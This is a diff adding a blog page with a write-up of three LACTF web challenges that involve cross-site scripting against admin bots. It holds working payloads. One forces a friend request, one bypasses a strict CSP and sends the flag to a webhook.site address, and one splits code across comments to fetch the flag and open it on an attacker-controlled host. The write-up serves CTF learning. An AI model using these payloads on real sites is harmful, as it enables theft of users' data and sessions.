@@ -3,6 +3,12 @@
 <head>
     <!-- Cool font :) -->
     <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@100..900" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/go.min.js"></script>
+
+    <script>hljs.highlightAll();</script>
     <!-- Custom CSS Theme :) -->
     <link rel="stylesheet" href="/style.css">
     <title>jaquiez</title>
@@ -15,14 +21,476 @@
             <li><a href="/Blogs">Blogs</a></li>
             <li><a href="/Projects">Projects</a></li>
             <li><a href="/Contact">Contact</a></li>
-        </ul>     
+        </ul>
     </div>
 
     <h1>
-        LACTF 2023
+        LACTF 2024
     </h1>
 
     <div class="container">
-        
+        <h1>
+            Overview
+        </h1>
+        <div class="blog-panel">
+            Since it's the first weekend of the semester I had time to play a bit of LACTF and really dig deep into a few of its challenges. However, it seems I only felt inclined to check out the XSS challenges. XSS challenges are fun though so I hope nobody is complaining :).
+        </div>
+
+        <h1 id="metaverse">Metaverse</h1>
+        <div class="blog-panel">
+            The first challenge I approached was metaverse, I solved it early in the CTF but in the end it had many solves so it seems like it was relatively straightforward for your average web player.
+        </div>
+        <img src="./images/metaverse.png" class="blog-image">
+
+        <h2>Initial Thoughts</h2>
+        <div class="blog-panel">
+            Looking through at the challenge description we have three places we can start looking <code class='inline_code'>https://metaverse.lac.tf/login</code> is the site, <code class='inline_code'>https://admin-bot.lac.tf/metaverse</code> is our admin bot, and we have a file called <code class='inline_code'>index.js</code> available for download. If you know much about CTFs the admin bot usually implies XSS. This admin bot will simulate an admin user visiting the link we send them.
+        </div>
+
+        <h2>Let's look at the code</h2>
+        <div class="blog-panel">
+            Okay so we know we need an XSS so let's see where the flag is in the source code.
+        </div>
+        <pre>
+            <code class="language-js">accounts.set("admin", {
+    password: adminpw,
+    displayName: flag,
+    posts: [],
+    friends: [],
+});
+/*
+some express code here...
+*/
+app.post("/friend", needsAuth, (req, res) =&gt; {
+    res.type("text/plain");
+    const username = req.body.username.trim();
+    if (!accounts.has(username)) {
+        res.status(400).send("Metauser doesn't metaexist");
+    } else {
+        const user = accounts.get(username);
+        if (user.friends.includes(res.locals.user)) {
+            res.status(400).send("Already metafriended");
+        } else {
+            user.friends.push(res.locals.user);
+            res.status(200).send("ok");
+        }
+    }
+});
+app.get("/friends", needsAuth, (req, res) =&gt; {
+    res.type("application/json");
+    res.send(
+        JSON.stringify(
+            accounts
+                .get(res.locals.user)
+                .friends.filter((username) =&gt; accounts.has(username))
+                .map((username) =&gt; ({
+                    username,
+                    displayName: accounts.get(username).displayName,
+                }))
+        )
+    );
+});</code>
+        </pre>
+        <div class="blog-panel">
+            <code class='inline_code'>index.html</code>
+        </div>
+        <pre>
+            <code class="language-js">fetch("/friends")
+    .then((res) =&gt; res.json())
+    .then((friends) =&gt; {
+        const list = document.getElementById("friendlist");
+        if (friends.length === 0) {
+            const ele = document.createElement("p");
+            ele.innerText = "you have none :(";
+            list.appendChild(ele);
+        }
+        for (const f of friends) {
+            const ele = document.createElement("p");
+            ele.innerText = `${f.displayName} (${f.username})`;
+            list.appendChild(ele);
+        }
+    });</code>
+        </pre>
+        <div class="blog-panel">
+            So the flag is set as the display name of the admin user. The display name of users is accessed when the client goes to their dashboard and display names are added via the <code class='inline_code'>/friends</code> endpoints. So we need an XSS payload that will execute a post request to <code class='inline_code'>/friend</code> to become mutual "metafriends" with admin.
+        </div>
+
+        <h2>Exploit setup</h2>
+        <div class="blog-panel">
+            First we can send our meta-friend request to admin. You can either do this through the html or by running some Javascript in the console. Let's go with the latter so we can use it in our XSS payload.
+        </div>
+        <pre>
+            <code class="language-js">fetch('/friend',{
+    method:'POST',
+    headers:{
+        "Content-type":'application/x-www-form-urlencoded'
+    },
+    body:'username=admin'
+})</code>
+        </pre>
+        <div class="blog-panel">
+            A simple fetch request with the appropriate headers and we're good to go. Now we can test this <code class='inline_code'>metapost</code> feature to see if XSS is possible through that vector. And looking at the code it seems to be the case. Our user content is directly replacing <code class='inline_code'>$CONTENT</code> in the <code class='inline_code'>post.html</code> file so it should be directly reflected to the user.
+        </div>
+        <pre>
+            <code class="language-js">// templating engines are for losers!
+const postTemplate = fs.readFileSync(path.join(__dirname, "post.html"), "utf8");
+app.get("/post/:id", (req, res) =&gt; {
+    if (posts.has(req.params.id)) {
+        res.type("text/html").send(postTemplate.replace("$CONTENT", () =&gt; posts.get(req.params.id)));
+    } else {
+        res.status(400).type("text/html").send(postTemplate.replace("$CONTENT", "post not found :("));
+    }
+});</code>
+        </pre>
+        <img src="./images/metapost.png" class="blog-image">
+        <img src="./images/xss.png" class="blog-image">
+
+        <h2>Exploitation</h2>
+        <div class="blog-panel">
+            So putting this together we should be able to make a POST request to <code class='inline_code'>/friend</code> via our XSS vector. So now we have the final payload and make a metapost with it as our content.
+        </div>
+        <pre>
+            <code class="language-html">&lt;script&gt;
+fetch('/friend',{
+    method:'POST',
+    headers:{
+        "Content-type":'application/x-www-form-urlencoded'
+    },
+    body:'username=bruhman420'
+})
+&lt;/script&gt;</code>
+        </pre>
+        <div class="blog-panel">
+            Finally, send the admin bot the url to our metapost and we should be greeted with the flag once we refresh our dashboard.
+        </div>
+        <img src="./images/ez.png" class="blog-image">
+
+        <h2>Final Thoughts on Metaverse</h2>
+        <div class="blog-panel">
+            Overall this was a very nice beginner challenge. I feel like it got people thinking about the code rather than copy pasting generic payloads.
+        </div>
+
+        <h1 id="csp">California State Police</h1>
+        <div class="blog-panel">
+            As I noted earlier, this was an only XSS ctf for me at least. So let's dive into the appropriately named California State Police challenge.
+        </div>
+        <img src="./images/csp.png" class="blog-image">
+
+        <h2>Initial Thoughts</h2>
+        <div class="blog-panel">
+            As the punny name and admin bot suggest this is another XSS challenge! First thing is first, we note that the cookie is <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies" target="_blank">HttpOnly</a> meaning we cannot access it using <code class='inline_code'>document.cookie</code>. With this we can start to get an idea of what exploitation is possible.
+        </div>
+
+        <h2>Let's Look at the Code</h2>
+        <div class="blog-panel">
+            Let's not get ahead of ourselves though! Before we can think about exploitation we should check out this <code class='inline_code'>index.js</code> file.
+        </div>
+        <pre>
+            <code class="language-js">app.get("/flag", (req, res) =&gt; {
+    res.status(400).send("you have to POST the flag this time &gt;:)");
+});
+app.post("/flag", (req, res) =&gt; {
+    if (req.cookies.adminpw === adminpw) {
+        res.send(flag);
+    } else {
+        res.status(400).send("no hacking allowed");
+    }
+});
+app.use((req, res, next) =&gt; {
+    res.set(
+        "Content-Security-Policy",
+        "default-src 'none'; script-src 'unsafe-inline'"
+    );
+    next();
+});
+app.post("/report", (req, res) =&gt; {
+    res.type("text/plain");
+    const crime = req.body.crime;
+    if (typeof crime !== "string") {
+        res.status(400).send("no crime provided");
+        return;
+    }
+    if (crime.length &gt; 2048) {
+        res.status(400).send("our servers aren't good enough to handle that");
+        return;
+    }
+    const id = uuid();
+    reports.set(id, crime);
+    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
+    res.redirect("/report/" + id);
+});
+app.get("/report/:id", (req, res) =&gt; {
+    if (reports.has(req.params.id)) {
+        res.type("text/html").send(reports.get(req.params.id));
+    } else {
+        res.type("text/plain").status(400).send("report doesn't exist");
+    }
+});</code>
+        </pre>
+        <div class="blog-panel">
+            So our flag is only accessible by admin on the <code class='inline_code'>/flag</code> endpoint with the POST method. So we'll need the admin bot to post to <code class='inline_code'>/flag</code> then send us the response. How can we achieve this? By submitting a totally valid report of course! Reports are plaintext received from the user and directly sent when navigating to <code class='inline_code'>/report/:id</code>. So submit a report that contains an XSS payload that sends the data from <code class='inline_code'>/flag</code> back to us. Easy! Or maybe not…
+        </div>
+
+        <h2>Naive Attempts</h2>
+        <div class="blog-panel">
+            Despite that ominous warning let's go ahead with our naive approach. We'll report a crime with the payload
+        </div>
+        <pre>
+            <code class="language-html">&lt;script&gt;
+fetch('/flag',{method:'POST'});
+&lt;/script&gt;</code>
+        </pre>
+        <img src="./images/attempt1.png" class="blog-image">
+        <img src="./images/reject.png" class="blog-image">
+        <img src="https://media.tenor.com/RjfbjPcbZk0AAAAd/walter-white.gif" class="blog-image">
+        <div class="blog-panel">
+            So it looks like our report executes the javascript but there is something we did not look at carefully in the code. <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">Content Security Policy (CSP)</a> mitigates our ability to execute arbitrary code and requests through XSS. The server response header for Content Security Policy specifies <code class='inline_code'>default-src 'none'; script-src 'unsafe-inline'</code>.
+        </div>
+        <img src="./images/csp2.png" class="blog-image">
+        <div class="blog-panel">
+            What does this mean? We are allowed to use <code class='inline_code'>unsafe-inline</code> for script tags so that's why our Javascript is executed. But <code class='inline_code'>default-src 'none'</code> means no resources are allowed to load, even ones served directly from the server.
+        </div>
+
+        <h2>It's Time to Cook</h2>
+        <img src="https://media.tenor.com/hRxU7RYOlMkAAAAC/breaking-bad-chemistry.gif" class="blog-image">
+        <div class="blog-panel">
+            At this point I got stuck for a while, how are we supposed to make a post request if all requests are blocked? But then I realized, we are sending a post request from the browser to upload our report! How does the site do that?
+        </div>
+        <pre>
+            <code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;California State Police&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;California State Police&lt;/h1&gt;
+    &lt;p&gt;Our site has been upgraded to use the latest security features, but for some reason we can't use CSS anymore. It'll probably be fine, no one really cares about styling anyways right?&lt;/p&gt;
+    &lt;h2&gt;Need to report a crime?&lt;/h2&gt;
+    &lt;form method="POST" action="/report"&gt;
+        &lt;textarea name="crime" placeholder="crime details..."&gt;&lt;/textarea&gt;&lt;br&gt;
+        &lt;input type="submit" value="Report Crime"&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code>
+        </pre>
+        <div class="blog-panel">
+            So the report is posted using a form, and if we try something similar with <code class='inline_code'>/flag</code> it should work. With HTML and Javascript this is not too difficult with a bit of help from documentation and StackOverflow.
+        </div>
+        <pre>
+            <code class="language-html">&lt;form method="post" id="theForm" action="/flag"&gt;&lt;/form&gt;
+&lt;script&gt; 
+    document.getElementById('theForm').submit();
+&lt;/script&gt;</code>
+        </pre>
+        <img src="./images/progress.png" class="blog-image">
+        <div class="blog-panel">
+            Nice the post request worked but we were redirected. That's not good since we want to read the response and send it to ourselves. So I got stuck again for a while and started googling… Until I stumbled upon <a href="https://lalitjc.wordpress.com/2013/05/03/2/" target="_blank">this post</a>! They provided the following template:
+        </div>
+        <pre>
+            <code class="language-js">function openWindow(){
+    var form = document.createElement('FORM');
+    form.method='POST';
+    form.action = 'PageToOpen.html';
+    form.target = 'newWindow'; // Specify the name of the window(second parameter to window.open method.)
+    var input = document.createElement("INPUT");
+    input.id="q";
+    input.type="hidden";
+    input.value="SOme large content";
+    form.appendChild(input);
+    document.body.appendChild(form);
+    window.open("","newWindow","location=yes,width=400,height=400");
+    form.submit();
+}</code>
+        </pre>
+        <div class="blog-panel">
+            So it looks like they are creating a new form that is posting to <code class='inline_code'>PageToOpen.html</code> and the output of the form is targeted to the <code class='inline_code'>'newWindow'</code> that is opened. So the form submits and POSTs but it will be in the new window meaning we still have JavaScript execution in our current window. Let's craft a payload that does this then:
+        </div>
+        <pre>
+            <code class="language-html">&lt;form method="post" id="theForm" action="/flag" target='bruh'&gt;
+    &lt;!-- Form body here --&gt;
+&lt;/form&gt;
+&lt;script&gt; 
+    let w = window.open('','bruh');
+    document.getElementById('theForm').submit();
+    setTimeout(()=&gt;{
+        document.location= `https://webhook.site/645c6365-01c7-4535-a172-a9014e389741?c=${w.document.body.innerHTML}`
+    },500);
+&lt;/script&gt;</code>
+        </pre>
+        <div class="blog-panel">
+            Our payload will open a new window <code class='inline_code'>bruh</code> which we store as a variable in our current program. We then submit the form that POSTs to <code class='inline_code'>/flag</code> and targets (executes in) <code class='inline_code'>bruh</code>. Then we'll <code class='inline_code'>setTimeout</code> to give some time for the form to submit and receive the response in the window before we redirect to our attack controlled site with the data we need.
+        </div>
+        <img src="./images/nice.png" class="blog-image">
+        <div class="blog-panel">
+            Nice! It worked how we expected but why? According to the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/open" target="_blank">MDN Docs</a> <code class='inline_code'>window.open</code> will open a blank new tab in our targeted context meaning that as long we are in the same domain we can access its contents through our Javascript. Okay let's send this to admin bot.
+        </div>
+        <img src="./images/win.png" class="blog-image">
+        <img src="https://media.tenor.com/n5ULG9d1MVgAAAAC/highfive-hyped.gif" class="blog-image">
+        <div class="blog-panel">
+            And there's the flag!
+        </div>
+
+        <h2>Final Thoughts on California State Police</h2>
+        <div class="blog-panel">
+            Overall this was a really interesting challenge as I never really did much with bypassing stricter CSP but I learned a lot through my research! Also it seems like there were additional solutions since both the <code class='inline_code'>GET</code> and <code class='inline_code'>POST</code> methods on <code class='inline_code'>/flag</code> did not have a Content Security Policy header! The challenge author had their solution <a href="https://github.com/uclaacm/lactf-archive/blob/main/2023/web/california-state-police/solve.txt" target="_blank">here</a> if you want to check it out.
+        </div>
+
+        <h1 id="hptla">hptla</h1>
+        <div class="blog-panel">
+            So the final XSS challenge (and CTF challenge) I worked on was hptla. It had fewer solves but I found the path to exploitation a lot more straight forward than the last challenge.
+        </div>
+        <img src="./images/last.png" class="blog-image">
+
+        <h2>Initial Thoughts & Code Review</h2>
+        <img src="https://media.tenor.com/cJRcMyUAiMcAAAAd/ah-shit-here-we-go-again-ah-shit.gif" class="blog-image">
+        <div class="blog-panel">
+            At this point you know the deal, admin bot means (probably) XSS! So let's go straight to source to get an idea of what we need.
+        </div>
+        <pre>
+            <code class="language-js">/*
+express code above here
+*/
+app.post("/list", (req, res) =&gt; {
+    res.type("text/plain");
+    const list = req.body.list;
+    if (typeof list !== "string") {
+        res.status(400).send("no list provided");
+        return;
+    }
+    const parsed = list
+        .trim()
+        .split("\n")
+        .map((x) =&gt; x.trim());
+    if (parsed.length &gt; 20) {
+        res.status(400).send("list must have at most 20 items");
+        return;
+    }
+    if (parsed.some((x) =&gt; x.length &gt; 12)) {
+        res.status(400).send("list items must not exceed 12 characters");
+        return;
+    }
+    const id = uuid();
+    lists.set(id, parsed);
+    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
+    res.send(id);
+});
+app.get("/list/:id", (req, res) =&gt; {
+    res.type("application/json");
+    if (lists.has(req.params.id)) {
+        res.send(lists.get(req.params.id));
+    } else {
+        res.status(400).send({error: "list doesn't exist"});
+    }
+});
+app.get("/flag", (req, res) =&gt; {
+    res.type("text/plain");
+    if (req.cookies.adminpw === adminpw) {
+        res.send(flag);
+    } else {
+        res.status(401).send("haha no");
+    }
+});
+/*
+express code below here
+*/</code>
+        </pre>
+        <div class="blog-panel">
+            So we need to make a request to <code class='inline_code'>/flag</code> on the admin bot and somehow send it to ourselves. The actual XSS is in this <code class='inline_code'>/list</code> endpoint where we can post a payload consisting of a maximum of 20 lines with each having a maximum of 12 characters.
+        </div>
+
+        <h2>Exploit Setup</h2>
+        <div class="blog-panel">
+            So let's just send a simple valid payload.
+        </div>
+        <img src="./images/tryharder.png" class="blog-image">
+        <img src="./images/failed.png" class="blog-image">
+        <div class="blog-panel">
+            Hm it doesn't work. When we take a look at the HTML we can see it's loaded as the following.
+        </div>
+        <pre>
+            <code class="language-html">&lt;ul id="list" class=""&gt;
+    &lt;li&gt;
+        &lt;input type="checkbox" id="item0"&gt;
+        &lt;label for="item0"&gt;&lt;img src="1&lt;/label&gt;&lt;/label&gt;
+    &lt;/li&gt;
+    &lt;li&gt;
+        &lt;input type="checkbox" id="item1"&gt;
+        &lt;label for="item1"&gt;onerror=&lt;/label&gt;
+    &lt;/li&gt;
+    &lt;li&gt;
+        &lt;input type="checkbox" id="item2"&gt;
+        &lt;label for="item2"&gt;print()&amp;gt;&lt;/label&gt;
+    &lt;/li&gt;
+&lt;/ul&gt;</code>
+        </pre>
+        <div class="blog-panel">
+            Okay at this point we can see that each value is embedded into a couple HTML attributes so we need a way to ignore the space between these and execute our code anyways. At this point I had the idea to use HTML comments.
+        </div>
+        <pre>
+            <code class="language-html">&lt;ul id="list" class=""&gt;
+    &lt;li&gt;&lt;input type="checkbox" id="item0"&gt;
+        &lt;label for="item0"&gt;&lt;img sr&lt;!--&lt;="" label=""&gt;
+        &lt;/label&gt;
+    &lt;/li&gt;
+    &lt;li&gt;
+        &lt;input type="checkbox" id="item1"&gt;
+        &lt;label for="item1"&gt;!--&amp;gt;c=1 &lt;!--&lt;/label&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;input type="checkbox" id="item2"&gt;&lt;label for="item2"&gt;!--&gt;oner&lt;!--&lt;/label&gt;&lt;/li&gt;&lt;li&gt;&lt;input type="checkbox" id="item3"&gt;&lt;label for="item3"&gt;!--&gt;ror=&lt;!--&lt;/label&gt;&lt;/li&gt;&lt;li&gt;&lt;input type="checkbox" id="item4"&gt;&lt;label for="item4"&gt;!--&gt;print()&amp;gt;&lt;/label&gt;
+    &lt;/li&gt;
+&lt;/ul&gt;</code>
+        </pre>
+        <div class="blog-panel">
+            So this idea didn't work because we cannot insert comments inside html elements. They are not treated as comments but as part of the element so it won't work for our purposes. The next thing I thought of was treating the src attribute like a string so it will consume all the content between and still execute as an error.
+        </div>
+        <pre>
+            <code class="language-html">&lt;img src='list stuff' onerror='our code!'&gt;</code>
+        </pre>
+        <div class="blog-panel">
+            We then can use the same thing for the onerror attribute and combine it with comments to try and achieve code execution. So our payload will look like:
+        </div>
+        <pre>
+            <code class="language-html">&lt;img src='
+'onerror='/*
+*/alert(9)'&gt;</code>
+        </pre>
+        <img src="./images/basic.png" class="blog-image">
+
+        <h2>Exploitation</h2>
+        <div class="blog-panel">
+            Nice, we got code execution so let's follow this same pattern to build a full payload.
+        </div>
+        <pre>
+            <code class="language-html">&lt;img src='
+'onerror='/*
+*/fetch(/*
+*/"flag")./*
+*/then(r=&gt;/*
+*/r.text()/*
+*/).then(/*
+*/t=&gt;/*
+*/window/*
+*/.open(/*
+*/"http:"+/*
+*/"//my"+/*
+*/".ip."+/*
+*/"lmao"+/*
+*/"/"+t))'&gt;</code>
+        </pre>
+        <div class="blog-panel">
+            Note, we cannot break up Javascript keywords. This is because Javascript comments are parsed as whitespace such that <code class='inline_code'>win/**/dow</code> is parsed as <code class='inline_code'>win dow</code> which breaks up the keywords and makes them invalid. Either way when we input the payload we'll receive this on the attacker controlled ip.
+        </div>
+        <img src="./images/resp.png" class="blog-image">
+        <div class="blog-panel">
+            Okay, that is the response we expect so we can now send it to the admin bot and we'll get our response and flag!
+        </div>
+        <img src="./images/done.png" class="blog-image">
+
+        <h2>Final Thoughts on hptla</h2>
+        <div class="blog-panel">
+            This challenge was pretty interesting and it is pretty practical as I've used some similar techniques on some real world targets (new blog post coming soon???). aplet123 made some fun challenges for this CTF so I'm looking forward to playing again next year. Thanks to the whole team at UCLA ACM Cyber for putting this together :)
+        </div>
     </div>
 </body>
